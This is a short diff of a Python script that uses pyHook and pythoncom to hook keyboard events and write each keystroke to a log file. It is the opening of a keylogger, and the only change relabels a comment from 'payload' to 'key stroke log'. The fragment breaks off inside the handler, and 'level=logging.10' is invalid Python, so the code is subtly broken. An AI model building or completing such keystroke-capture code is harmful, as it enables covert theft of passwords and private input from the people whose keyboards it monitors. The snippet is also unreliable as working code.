@@ -1,6 +1,6 @@
 import pyHook, pythoncom, sys, logging
 
-file_log = '' #File path for payload
+file_log = '' #File path for key stroke log
 
 def OnKeyboardEvent(event):
 	logging.basicConfig(filename=file_log, level=logging.10, format='%(message)s')
